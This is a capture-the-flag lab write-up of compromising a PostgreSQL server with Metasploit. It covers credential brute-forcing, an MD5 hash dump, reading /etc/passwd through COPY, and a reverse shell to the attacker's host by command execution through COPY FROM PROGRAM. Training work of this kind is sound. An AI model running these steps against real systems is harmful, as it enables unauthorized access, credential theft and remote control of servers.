#### 1 What is the rdbms installed on the server?
A)postgresql

#### 2 What port is the rdbms running on?
A)5432

![image](https://user-images.githubusercontent.com/6504854/234552929-7c49a0fe-0d8b-4f9e-81a3-9e6ff1f381f7.png)

#### 3 Noanswer


#### 4 After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?
A)auxiliary/scanner/postgres/postgres_login

```
msf6 > search postgres

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   auxiliary/server/capture/postgresql                                          normal     No     Authentication Capture: PostgreSQL
   1   post/linux/gather/enum_users_history                                         normal     No     Linux Gather User History
   2   exploit/multi/http/manage_engine_dc_pmp_sqli                2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   3   exploit/windows/misc/manageengine_eventlog_analyzer_rce     2015-07-11       manual     Yes    ManageEngine EventLog Analyzer Remote Code Execution
   4   auxiliary/admin/http/manageengine_pmp_privesc               2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   5   auxiliary/analyze/crack_databases                                            normal     No     Password Cracker: Databases
   6   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   7   exploit/multi/postgres/postgres_createlang                  2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution
   8   auxiliary/scanner/postgres/postgres_dbname_flag_injection                    normal     No     PostgreSQL Database Name Command Line Flag Injection
   9   auxiliary/scanner/postgres/postgres_login                                    normal     No     PostgreSQL Login Utility
   10  auxiliary/admin/postgres/postgres_readfile                                   normal     No     PostgreSQL Server Generic Query
   11  auxiliary/admin/postgres/postgres_sql                                        normal     No     PostgreSQL Server Generic Query
   12  auxiliary/scanner/postgres/postgres_version                                  normal     No     PostgreSQL Version Probe
   13  exploit/linux/postgres/postgres_payload                     2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution
   14  exploit/windows/postgres/postgres_payload                   2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution
   15  auxiliary/scanner/postgres/postgres_hashdump                                 normal     No     Postgres Password Hashdump
   16  auxiliary/scanner/postgres/postgres_schemadump                               normal     No     Postgres Schema Dump
   17  auxiliary/admin/http/rails_devise_pass_reset                2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset
   18  post/linux/gather/vcenter_secrets_dump                      2022-04-15       normal     No     VMware vCenter Secrets Dump


Interact with a module by name or index. For example info 18, use 18 or use post/linux/gather/vcenter_secrets_dump                                                                              
```
```
msf6 > info 1

       Name: Linux Gather User History
     Module: post/linux/gather/enum_users_history

Description:
  This module gathers the following user-specific information: shell 
  history, MySQL history, PostgreSQL history, MongoDB history, Vim 
  history, lastlog, and sudoers.
```
```
msf6 > info 9

       Name: PostgreSQL Login Utility
     Module: auxiliary/scanner/postgres/postgres_login
    License: Metasploit Framework License (BSD)
       Rank: Normal

Description:
  This module attempts to authenticate against a PostgreSQL instance 
  using username and password combinations indicated by the USER_FILE, 
  PASS_FILE, and USERPASS_FILE options. Note that passwords may be 
  either plaintext or MD5 formatted hashes.
```
といことでたぶんUser列挙は9っぽい。

#### 5 What are the credentials you found?
A)postgres:password

```
msf6 > use 9
msf6 auxiliary(scanner/postgres/postgres_login) > set RHOSTS 10.10.118.114
RHOSTS => 10.10.118.114
msf6 auxiliary(scanner/postgres/postgres_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.10.118.114:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 10.10.118.114:5432 - LOGIN FAILED: postgres:postgres@template1 (Incorrect: Invalid username or password)
-------------snip--------------
[+] 10.10.118.114:5432 - Login Successful: postgres:password@template1
```

#### 6 What is the full path of the module that allows you to execute commands with the proper user credentials (starting with auxiliary)?
A)auxiliary/admin/postgres/postgres_sql

```
msf6 auxiliary(scanner/postgres/postgres_login) > use 11
msf6 auxiliary(admin/postgres/postgres_sql) > info

       Name: PostgreSQL Server Generic Query
     Module: auxiliary/admin/postgres/postgres_sql
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  todb <todb@metasploit.com>

Check supported:
  No

Basic options:
  Name           Current Setting   Required  Description
  ----           ---------------   --------  -----------
  DATABASE       template1         yes       The database to authenticate against
  PASSWORD       postgres          no        The password for the specified username. Leave bl
                                             ank for a random password.
  RETURN_ROWSET  true              no        Set to true to see query result sets
  RHOSTS                           yes       The target host(s), see https://docs.metasploit.c
                                             om/docs/using-metasploit/basics/using-metasploit.
                                             html
  RPORT          5432              yes       The target port
  SQL            select version()  no        The SQL query to execute
  USERNAME       postgres          yes       The username to authenticate as
  VERBOSE        false             no        Enable verbose output

Description:
  This module will allow for simple SQL statements to be executed 
  against a PostgreSQL instance given the appropriate credentials.

References:
  www.postgresql.org


View the full module info with the info -d command.

msf6 auxiliary(admin/postgres/postgres_sql) > set RHOSTS 10.10.118.114
RHOSTS => 10.10.118.114
msf6 auxiliary(admin/postgres/postgres_sql) > set PASSWORD password
PASSWORD => password
msf6 auxiliary(admin/postgres/postgres_sql) > run
[*] Running module against 10.10.118.114

Query Text: 'select version()'
==============================

    version
    -------
    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12)
     5.4.0 20160609, 64-bit

[*] Auxiliary module execution completed

```

ポスグレ大文字小文字区別するので注意しましょう。
Note that postgres case-sensitive.

#### 7 Based on the results of #6, what is the rdbms version installed on the server?
A)9.5.21

#### 8 What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?
A)auxiliary/scanner/postgres/postgres_hashdump

#### 9 How many user hashes does the module dump?
A)6

```
[+] Query appears to have run successfully
[+] Postgres Server Hashes
======================

 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### 10 What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?
A)auxiliary/admin/postgres/postgres_readfile

```
msf6 auxiliary(admin/postgres/postgres_readfile) > set RHOSTS 10.10.171.199
RHOSTS => 10.10.171.199
msf6 auxiliary(admin/postgres/postgres_readfile) > set PASSWORD password
PASSWORD => password
msf6 auxiliary(admin/postgres/postgres_readfile) > run
[*] Running module against 10.10.171.199

Query Text: 'CREATE TEMP TABLE BDGigOZtlHy (INPUT TEXT);
      COPY BDGigOZtlHy FROM '/etc/passwd';
      SELECT * FROM BDGigOZtlHy'
====================================================================================================================================

    input
    -----
    #/home/dark/credentials.txt
    _apt:x:105:65534::/nonexistent:/bin/false
    alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    dark:x:1001:1001::/home/dark:
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
------------ snip ----------------
postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
dark:x:1001:1001::/home/dark:
[+] 10.10.171.199:5432 Postgres - /etc/passwd saved in /home/kali/.msf4/loot/20230426201333_default_10.10.171.199_postgres.file_687072.txt
[*] Auxiliary module execution completed

```

#### 11 What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)? 
A)exploit/multi/postgres/postgres_copy_from_program_cmd_exec

#### 12 Compromise the machine and locate user.txt
```
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run

[-] Handler failed to bind to 10.8.110.136:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] 10.10.171.199:5432 - Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
[*] Exploit completed, but no session was created.
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run

[*] Started reverse TCP handler on 10.8.110.136:4444 
[*] 10.10.171.199:5432 - 10.10.171.199:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
[*] 10.10.171.199:5432 - Exploiting...
[+] 10.10.171.199:5432 - 10.10.171.199:5432 - WW45HJZiyqE dropped successfully
[+] 10.10.171.199:5432 - 10.10.171.199:5432 - WW45HJZiyqE created successfully
[+] 10.10.171.199:5432 - 10.10.171.199:5432 - WW45HJZiyqE copied successfully(valid syntax/command)
[+] 10.10.171.199:5432 - 10.10.171.199:5432 - WW45HJZiyqE dropped successfully(Cleaned)
[*] 10.10.171.199:5432 - Exploit Succeeded
[*] Command shell session 1 opened (10.8.110.136:4444 -> 10.10.171.199:54894) at 2023-04-26 20:18:35 +0900

id
uid=109(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
pwd
/var/lib/postgresql/9.5/main

find / -name user.txt 2>/dev/null 
/home/alison/user.txt
```

#### 13 Escalate privileges and obtain root.txt
```
alison@ubuntu:/home/dark$ sudo -l
[sudo] password for alison: 
Matching Defaults entries for alison on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

Thank you for your time! Enjoy!
